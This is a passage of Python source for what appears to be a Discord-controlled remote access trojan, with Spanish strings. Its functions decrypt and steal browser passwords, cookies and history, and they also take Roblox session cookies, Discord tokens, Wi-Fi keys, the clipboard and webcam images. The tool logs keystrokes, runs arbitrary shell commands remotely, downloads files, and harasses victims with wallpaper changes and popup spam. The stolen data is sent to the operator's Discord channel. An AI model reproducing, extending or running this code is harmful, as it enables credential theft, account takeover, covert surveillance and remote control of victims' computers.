v("APPDATA", ""), name)     try:         import winreg         key = winreg.HKEY_CURRENT_USER         sub = r"Software\Microsoft\Windows\CurrentVersion\Run"         with winreg.OpenKey(key, sub, 0, winreg.KEY_SET_VALUE) as k:             try:                 winreg.DeleteValue(k, "SystemUpdate")             except FileNotFoundError:                 pass     except Exception:         pass     try:         if os.path.exists(dest):             os.remove(dest)     except Exception:         pass     return dest  BROWSERS = {     "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),     "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),     "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),     "Opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"), }  def get_chromium_key(browser_path):     local_state = os.path.join(browser_path, "Local State")     if not os.path.isfile(local_state):         return None     try:         with open(local_state, "r", encoding="utf-8") as f:             data = json.load(f)         enc_key = data.get("os_crypt", {}).get("encrypted_key")         if not enc_key:             return None         key = base64.b64decode(enc_key)         if key.startswith(b"DPAPI"):             if CryptUnprotectData is None:                 return None             key = CryptUnprotectData(key[5:], None, None, None, 0)[1]         return key     except Exception:         return None  def decrypt_chromium(enc, key):     if not enc:         return "", "empty"     if key is not None and AES is not None and enc[:3] == b"v10":         try:             nonce = enc[3:15]             ciphertext = enc[15:-16]             tag = enc[-16:]             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)             dec = cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="ignore")             return dec, "ok-aes"         except Exception as e:             return f"AES_ERROR:{e}", "aes_fail"     if CryptUnprotectData is not None:         try:             dec = CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8", errors="ignore")             return dec, "ok-dpapi"         except Exception as e:             return f"DPAPI_ERROR:{e}", "dpapi_fail"     return f"RAW_LEN:{len(enc)}", "no_decryptor"  def iter_dbs(browser, base, dbname):     if not os.path.isdir(base):         return     for profile in os.listdir(base):         pdir = os.path.join(base, profile)         if not os.path.isdir(pdir):             continue         parts = dbname.split("/")         db = os.path.join(pdir, *parts)         if os.path.isfile(db):             yield profile, db  def copy_db(db):     tmp = os.path.join(tempfile.gettempdir(), f"rat_db_{os.getpid()}_{os.path.basename(db)}")     try:         shutil.copy2(db, tmp)         return tmp     except Exception:         return None  def chrome_time(ts):     try:         return (datetime(1601, 1, 1) + timedelta(microseconds=ts)).strftime("%Y-%m-%d %H:%M:%S")     except Exception:         return str(ts)  def steal_history():     out = []     for browser, base in BROWSERS.items():         key = get_chromium_key(base)         for profile, db in iter_dbs(browser, base, "History"):             tmp = copy_db(db)             if not tmp:                 continue             try:                 con = sqlite3.connect(tmp)                 cur = con.cursor()                 try:                     cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls")                     for url, title, visits, ts in cur.fetchall():                         out.append(f"{browser}\t{profile}\t{chrome_time(ts)}\t{visits}\t{title or ''}\t{url}")                 except sqlite3.Error:                     pass                 finally:                     con.close()             except Exception:                 pass             finally:                 try:                     os.remove(tmp)                 except OSError:                     pass     return "\n".join(out) if out else "(no historial recuperado)"  def steal_passwords():     out = []     for browser, base in BROWSERS.items():         key = get_chromium_key(base)         for profile, db in iter_dbs(browser, base, "Login Data"):             tmp = copy_db(db)             if not tmp:                 continue             try:                 con = sqlite3.connect(tmp)                 cur = con.cursor()                 try:                     cur.execute("SELECT origin_url, username_value, password_value FROM logins")                     for origin, user, enc in cur.fetchall():                         dec, status = decrypt_chromium(enc, key)                         out.append(f"{browser}\t{profile}\t{origin}\t{user or ''}\t[{status}]\t{dec}")                 except sqlite3.Error:                     pass                 finally:                     con.close()             except Exception:                 pass             finally:                 try:                     os.remove(tmp)                 except OSError:                     pass     return "\n".join(out) if out else "(no contraseñas recuperadas)"  def decrypt(enc):     if not enc or CryptUnprotectData is None:         return ""     try:         return CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8", errors="ignore")     except Exception:         return ""  def cookie_rows(browser, base):     rows = []     if not os.path.isdir(base):         return rows     for profile, db in iter_dbs(browser, base, "Network/Cookies"):         tmp = copy_db(db)         if not tmp:             continue         try:             con = sqlite3.connect(tmp)             cur = con.cursor()             try:                 cur.execute("SELECT host_key, name, value, encrypted_value FROM cookies")                 for host, name, value, enc in cur.fetchall():                     dec = decrypt(enc) if enc else (value or "")                     rows.append(f"{browser}\t{profile}\t{host}\t{name}\t{dec}")             except sqlite3.Error:                 pass             finally:                 con.close()         except Exception:             pass         finally:             try:                 os.remove(tmp)             except OSError:                 pass     return rows  def steal_cookies():     out = []     for browser, base in BROWSERS.items():         out.extend(cookie_rows(browser, base))     return "\n".join(out) if out else "(no cookies recovered)"  def steal_clipboard():     try:         ctypes.windll.user32.OpenClipboard(None)         handle = ctypes.windll.user32.GetClipboardData(13)         if handle:             ptr = ctypes.windll.kernel32.GlobalLock(handle)             if ptr:                 size = ctypes.windll.kernel32.GlobalSize(handle)                 buf = ctypes.create_string_buffer(size)                 ctypes.memmove(buf, ptr, size)                 ctypes.windll.kernel32.GlobalUnlock(handle)                 ctypes.windll.user32.CloseClipboard()                 return buf.value.decode("utf-8", errors="ignore")         ctypes.windll.user32.CloseClipboard()     except Exception:         pass     return "(portapapeles vacio o inaccesible)"  def steal_wifi():     out = []     try:         res = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=15)         profiles = []         for line in res.stdout.splitlines():             if "Perfil de usuario" in line or "User profile" in line:                 profiles.append(line.split(":")[-1].strip())         for prof in profiles:             res2 = subprocess.run(["netsh", "wlan", "show", "profile", f"name={prof}", "key=clear"], capture_output=True, text=True, timeout=15)             pwd = ""             for line in res2.stdout.splitlines():                 if "Contenido de la clave" in line or "Key Content" in line:                     pwd = line.split(":")[-1].strip()             out.append(f"{prof} | {pwd}")     except Exception as e:         out.append(f"wifi fallo: {e}")     return "\n".join(out) if out else "(no wifi recuperado)"  def decode_roblox_cookie(val):     tries = [val]     try:         tries.append(urllib.parse.unquote(val))     except Exception:         pass     try:         pad = val + '=' * (-len(val) % 4)         tries.append(base64.b64decode(pad).decode("utf-8", errors="ignore"))     except Exception:         pass     try:         tries.append(bytes.fromhex(val).decode("utf-8", errors="ignore"))     except Exception:         pass     try:         import codecs         tries.append(codecs.decode(val, "rot_13"))     except Exception:         pass     for t in tries:         if t and t != val and "." in t and len(t) > 20:             return t     return val  def extract_roblox_from_text(text):     out = []     for match in re.finditer(r".ROBLOSECURITY\s*[=:]\s*([^\s\"'\\]+)", text, re.IGNORECASE):         val = match.group(1).strip()         if val:             out.append(val)             dec = decode_roblox_cookie(val)             if dec and dec != val and dec not in out:                 out.append(dec)     for match in re.finditer(r"[A-Za-z0-9+/=]{80,}", text):         val = match.group(0).strip()         if val:             out.append(val)             dec = decode_roblox_cookie(val)             if dec and dec != val and dec not in out:                 out.append(dec)     seen = set()     deduped = []     for v in out:         if v not in seen:             seen.add(v)             deduped.append(v)     return deduped  def read_robloxcookie_dat(path):     out = []     try:         with open(path, "r", encoding="utf-8", errors="ignore") as f:             content = f.read()         found = extract_roblox_from_text(content)         for val in found:             if val not in out:                 out.append(val)     except Exception:         try:             with open(path, "rb") as f:                 raw = f.read()             text = raw.decode("utf-8", errors="ignore")             found = extract_roblox_from_text(text)             for val in found:                 if val not in out:                     out.append(val)         except Exception:             pass     return out  def steal_roblox():     out = []     local = os.getenv("LOCALAPPDATA", "")      main_path = os.path.join(local, "Roblox", "LocalStorage", "RobloxCookies.dat")     if os.path.isfile(main_path):         out.extend(read_robloxcookie_dat(main_path))      candidates = []     candidates.append(os.path.join(local, "Roblox", "LocalStorage", "RobloxCookies.dat"))     candidates.append(os.path.join(os.getenv("APPDATA", ""), "Roblox", "LocalStorage", "RobloxCookies.dat"))     candidates.append(os.path.join(local, "Roblox", "Cookies", "Cookies.dat"))     candidates.append(os.path.join(os.getenv("APPDATA", ""), "Roblox", "Cookies", "Cookies.dat"))     versions = os.path.join(local, "Roblox", "Versions")     if os.path.isdir(versions):         for ver in os.listdir(versions):             p = os.path.join(versions, ver, "Cookies", "Cookies.dat")             candidates.append(p)      seen = set()     for path in candidates:         if not os.path.isfile(path):             continue         if path in seen:             continue         seen.add(path)         out.extend(read_robloxcookie_dat(path))      if not out:         ls_dir = os.path.join(local, "Roblox", "LocalStorage")         if os.path.isdir(ls_dir):             for root, dirs, files in os.walk(ls_dir):                 for file in files:                     path = os.path.join(root, file)                     found = read_robloxcookie_dat(path)                     for val in found:                         if val not in out:                             out.append(val)      return "\n".join(out) if out else "(ninguna cookie .ROBLOSECURITY en RobloxCookies.dat)"  def steal_discord_tokens():     out = []     bases = [         os.path.expandvars(r"%APPDATA%\discord"),         os.path.expandvars(r"%APPDATA%\discordcanary"),         os.path.expandvars(r"%APPDATA%\discordptb"),     ]     token_re = re.compile(r"[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}")     mfa_re = re.compile(r"mfa\.[A-Za-z0-9_-]{64,}")     target_ext = (".ldb", ".log", ".txt", ".json")      for base in bases:         if not os.path.isdir(base):             continue         for root, dirs, files in os.walk(base):             for file in files:                 if not file.lower().endswith(target_ext):                     continue                 path = os.path.join(root, file)                 try:                     with open(path, "r", encoding="utf-8", errors="ignore") as f:                         content = f.read()                     for token in token_re.findall(content):                         token = token.strip(" .,;:\"'[]{}()<>`")                         parts = token.split(".")                         if len(parts) != 3:                             continue                         if not parts[0] or not parts[1] or not parts[2]:                             continue                         if not parts[0][0].isalnum():                             continue                         if token not in out:                             out.append(token)                     for token in mfa_re.findall(content):                         token = token.strip(" .,;:\"'[]{}()<>`")                         if token not in out:                             out.append(token)                 except Exception:                     pass     return "\n".join(out) if out else "(no tokens encontrados)"  def take_webcam():     path = os.path.join(tempfile.gettempdir(), "cam.jpg")     try:         import cv2         cap = cv2.VideoCapture(0)         ret, frame = cap.read()         if ret:             cv2.imwrite(path, frame)         cap.release()     except Exception:         try:             import pyautogui             pyautogui.screenshot().save(path)         except Exception:             return None     return path if os.path.exists(path) else None  def get_wallpaper():     buf = ctypes.create_unicode_buffer(512)     ok = ctypes.windll.user32.SystemParametersInfoW(0x0073, 512, buf, 0)     return buf.value if ok else None  def set_wallpaper(path):     abspath = os.path.abspath(path)     ok = ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, abspath, 0x0003)     return ok  def make_hacked_wallpaper():     path = os.path.join(tempfile.gettempdir(), "hackeado_tortitas.bmp")     w, h = 1920, 1080     row_bytes = w * 3     pad = (4 - (row_bytes % 4)) % 4     row_size = row_bytes + pad     image_size = row_size * h     file_size = 14 + 40 + image_size      fh = struct.pack("<2sIHHI", b"BM", file_size, 0, 0, 54)     dh = struct.pack("<IIHHIIiiII", 40, w, h, 1, 24, 0, image_size, 0, 0, 0, 0)      row = b"\x00\xff\x00" * w + b"\x00" * pad     with open(path, "wb") as f:         f.write(fh)         f.write(dh)         for _ in range(h):             f.write(row)     return path  def cmd_spam():     while not CMD_STOP.is_set():         try:             subprocess.Popen("start cmd", shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)         except Exception:             pass         CMD_STOP.wait(0.5)  def msgbox_spam():     while not SPAM_STOP.is_set():         try:             ctypes.windll.user32.MessageBoxW(None, "hackeado por eltortitas", "HACKED", 0x0030)         except Exception:             pass         SPAM_STOP.wait(0.4)  keylog_path = os.path.join(tempfile.gettempdir(), "keys.log") keylog_running = False  def start_keylog():     global keylog_running     if keylog_running:         return     keylog_running = True     try:         from pynput.keyboard import Listener         def on_press(key):             try:                 with open(keylog_path, "a", encoding="utf-8") as f:                     f.write(f"{key.char}")             except AttributeError:                 with open(keylog_path, "a", encoding="utf-8") as f:                     f.write(f" [{key}] ")         listener = Listener(on_press=on_press)         listener.start()     except Exception:         pass  def stop_keylog():     global keylog_running     keylog_running = False     if os.path.exists(keylog_path):         with open(keylog_path, "r", encoding="utf-8", errors="ignore") as f:             data = f.read()         try:             os.remove(keylog_path)         except OSError:             pass         return data     return "(no se capturo nada)"  @bot.event async def on_ready():     log(f"logged in as {bot.user}")     channel = bot.get_channel(CHANNEL_ID)     if channel:         info = f"{platform.node()} | {getpass.getuser()} | {platform.platform()}"         await channel.send(f"`{stamp()} online — {info}`")     persist()  def is_owner(ctx):     return ctx.author.id == OWNER_ID  @bot.command(name="ss") async def ss_cmd(ctx):     if not is_owner(ctx):         return     path = os.path.join(tempfile.gettempdir(), "snap.png")     try:         with mss() as sct:             sct.shot(output=path)         await ctx.send(file=discord.File(path))     except Exception as e:         await ctx.send(f"```\nss fallo: {e}\n```")     finally:         try:             os.remove(path)         except OSError:             pass  @bot.command(name="credenciales") async def creds_cmd(ctx):     if not is_owner(ctx):         return     data = steal_cookies()     path = os.path.join(tempfile.gettempdir(), "cookies.txt")     with open(path, "w", encoding="utf-8") as f:         f.write(data)     try:         await ctx.send(file=discord.File(path))     except Exception as e:         await ctx.send(f"```\ncredenciales fallo: {e}\n```")     finally:         try:             os.remove(path)         except OSError:             pass  @bot.command(name="hist") async def hist_cmd(ctx):     if not is_owner(ctx):         return     data = steal_history()     path = os.path.join(tempfile.gettempdir(), "historial.txt")     with open(path, "w", encoding="utf-8") as f:         f.write(data)     try:         await ctx.send(file=discord.File(path))     except Exception as e:         await ctx.send(f"```\nhistorial fallo: {e}\n```")     finally:         try:             os.remove(path)         except OSError:             pass  @bot.command(name="pwd") async def pwd_cmd(ctx):     if not is_owner(ctx):         return     data = steal_passwords()     path = os.path.join(tempfile.gettempdir(), "contraseñas.txt")     with open(path, "w", encoding="utf-8") as f:         f.write(data)     try:         await ctx.send(file=discord.File(path))     except Exception as e:         await ctx.send(f"```\ncontraseñas fallo: {e}\n```")     finally:         try:             os.remove(path)         except OSError:             pass  @bot.command(name="roblox") async def roblox_cmd(ctx):     if not is_owner(ctx):         return     data = steal_roblox()     path = os.path.join(tempfile.gettempdir(), "roblox_cookie.txt")     with open(path, "w", encoding="utf-8") as f:         f.write(data)     try:         await ctx.send(file=discord.File(path))     except Exception as e:         await ctx.send(f"```\nroblox fallo: {e}\n```")     finally:         try:             os.remove(path)         except OSError:             pass  @bot.command(name="tokens") async def tokens_cmd(ctx):     if not is_owner(ctx):         return     data = steal_discord_tokens()     path = os.path.join(tempfile.gettempdir(), "tokens.txt")     with open(path, "w", encoding="utf-8") as f:         f.write(data)     try:         await ctx.send(file=discord.File(path))     except Exception as e:         await ctx.send(f"```\ntokens fallo: {e}\n```")     finally:         try:             os.remove(path)         except OSError:             pass  @bot.command(name="cmd") async def cmd_cmd(ctx, *, command: str):     if not is_owner(ctx):         return     try:         res = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, creationflags=subprocess.CREATE_NO_WINDOW)         output = res.stdout + res.stderr     except subprocess.TimeoutExpired:         output = "comando: tiempo agotado"     except Exception as e:         output = f"cmd fallo: {e}"     if not output:         output = "(vacio)"     for i in range(0, len(output), 1900):         await ctx.send(f"```\n{output[i:i+1900]}\n```")  @bot.command(name="borrar") async def borrar_cmd(ctx):     if not is_owner(ctx):         return     dest = unpick()     try:         await ctx.send(f"```\nrat eliminado del equipo.\nregistro y archivo borrado: {dest}\n```")     except Exception:         pass     await bot.close()     os._exit(0)  @bot.command(name="clip") async def clip_cmd(ctx):     if not is_owner(ctx):         return     await ctx.send(f"```\n{steal_clipboard()}\n```")  @bot.command(name="wifi") async def wifi_cmd(ctx):     if not is_owner(ctx):         return     data = steal_wifi()     path = os.path.join(tempfile.gettempdir(), "wifi.txt")     with open(path, "w", encoding="utf-8") as f:         f.write(data)     try:         await ctx.send(file=discord.File(path))     except Exception as e:         await ctx.send(f"```\nwifi fallo: {e}\n```")     finally:         try:             os.remove(path)         except OSError:             pass  @bot.command(name="webcam") async def webcam_cmd(ctx):     if not is_owner(ctx):         return     path = take_webcam()     if path:         try:             await ctx.send(file=discord.File(path))         except Exception as e:             await ctx.send(f"```\nwebcam fallo: {e}\n```")         finally:             try:                 os.remove(path)             except OSError:                 pass     else:         await ctx.send("```\nwebcam no disponible o cv2/pyautogui no instalado\n```")  @bot.command(name="keylog") async def keylog_cmd(ctx, modo: str = "estado"):     if not is_owner(ctx):         return     if modo.lower() == "iniciar":         start_keylog()         await ctx.send("```\nkeylogger iniciado\n```")     elif modo.lower() == "detener":         data = stop_keylog()         path = os.path.join(tempfile.gettempdir(), "keys_dump.txt")         with open(path, "w", encoding="utf-8") as f:             f.write(data)         try:             await ctx.send(file=discord.File(path))         except Exception as e:             await ctx.send(f"```\nkeylog fallo: {e}\n```")         finally:             try:                 os.remove(path)             except OSError:                 pass     else:         await ctx.send("```\nuso: .keylog iniciar | .keylog detener\n```")  @bot.command(name="download") async def download_cmd(ctx, url: str):     if not is_owner(ctx):         return     name = url.split("/")[-1] or "descarga"     path = os.path.join(tempfile.gettempdir(), name)     try:         urllib.request.urlretrieve(url, path)         await ctx.send(f"```\ndescargado: {path}\n```")     except Exception as e:         await ctx.send(f"```\ndownload fallo: {e}\n```")  @bot.command(name="upload") async def upload_cmd(ctx, *, ruta: str):     if not is_owner(ctx):         return     if not os.path.isfile(ruta):         await ctx.send("```\narchivo no encontrado\n```")         return     try:         await ctx.send(file=discord.File(ruta))     except Exception as e:         await ctx.send(f"```\nupload fallo: {e}\n```")  @bot.command(name="msgbox") async def msgbox_cmd(ctx, titulo: str, *, texto: str):     if not is_owner(ctx):         return     try:         ctypes.windll.user32.MessageBoxW(None, texto, titulo, 0)         await ctx.send("```\nmsgbox mostrado\n```")     except Exception as e:         await ctx.send(f"```\nmsgbox fallo: {e}\n```")  @bot.command(name="shutdown") async def shutdown_cmd(ctx):     if not is_owner(ctx):         return     try:         os.system("shutdown /s /t 5")         await ctx.send("```\napagando en 5 segundos\n```")     except Exception as e:         await ctx.send(f"```\nshutdown fallo: {e}\n```")  @bot.command(name="restart") async def restart_cmd(ctx):     if not is_owner(ctx):         return     try:         os.system("shutdown /r /t 5")         await ctx.send(f"```\nreiniciando en 5 segundos\n```")     except Exception as e:         await ctx.send(f"```\nrestart fallo: {e}\n```")  @bot.command(name="ip") async def ip_cmd(ctx):     if not is_owner(ctx):         return     try:         pub = urllib.request.urlopen("https://api.ipify.org", timeout=10).read().decode()     except Exception:         pub = "(no se pudo)"     priv = subprocess.run("ipconfig", capture_output=True, text=True).stdout     await ctx.send(f"```\npublica: {pub}\nlocal:\n{priv}\n```")  @bot.command(name="procesos") async def procesos_cmd(ctx):     if not is_owner(ctx):         return     try:         res = subprocess.run("tasklist", capture_output=True, text=True, timeout=15)         output = res.stdout     except Exception as e:         output = f"procesos fallo: {e}"     if not output:         output = "(vacio)"     for i in range(0, len(output), 1900):         await ctx.send(f"```\n{output[i:i+1900]}\n```")  @bot.command(name="matar") async def matar_cmd(ctx, pid: int):     if not is_owner(ctx):         return     try:         os.system(f"taskkill /PID {pid} /F")         await ctx.send(f"```\nproceso {pid} terminado\n```")     except Exception as e:         await ctx.send(f"```\nmatar fallo: {e}\n```")  @bot.command(name="asustar") async def asustar_cmd(ctx):     if not is_owner(ctx):         return     global ORIGINAL_WALLPAPER     msgs = []     try:         ORIGINAL_WALLPAPER = get_wallpaper()         msgs.append(f"fondo original guardado: {ORIGINAL_WALLPAPER}")     except Exception as e:         msgs.append(f"no se pudo leer fondo original: {e}")      try:         wp = make_hacked_wallpaper()         ok = set_wallpaper(wp)         if ok:             msgs.append(f"fondo cambiado a: {wp}")         else:             msgs.append("set_wallpaper devolvio False")     except Exception as e:         msgs.append(f"fondo fallo: {e}")      SPAM_STOP.clear()     CMD_STOP.clear()     try:         threading.Thread(target=cmd_spam, daemon=True).start()         msgs.append("cmd spam iniciado")     except Exception as e:         msgs.append(f"cmd spam fallo: {e}")      try:         threading.Thread(target=msgbox_spam, daemon=True).start()         msgs.append("msgbox spam iniciado")     except Exception as e:         msgs.append(f"msgbox spam fallo: {e}")      await ctx.send("```\n" + "\n".join(msgs) + "\n```")  @bot.command(name="re") async def re_cmd(ctx):     if not is_owner(ctx):         return     SPAM_STOP.set()     CMD_STOP.set()     msgs = ["hilos detenidos"]     try:         os.system("taskkill /f /im cmd.exe >nul 2>&1")         msgs.append("cmd.exe matados")     except Exception as e:         msgs.append(f"taskkill fallo: {e}")      global ORIGINAL_WALLPAPER     if ORIGINAL_WALLPAPER and os.path.isfile(ORIGINAL_WALLPAPER):         try:             ok = set_wallpaper(ORIGINAL_WALLPAPER)             if ok:                 msgs.append("fondo restaurado")             else:                 msgs.append("restaurar fondo devolvio False")         except Exception as e:             msgs.append(f"restaurar fondo fallo: {e}")     else:         msgs.append("no hay fondo original guardado")      await ctx.send("```\n" + "\n".join(msgs) + "\n```")  bot.run(TOKEN)

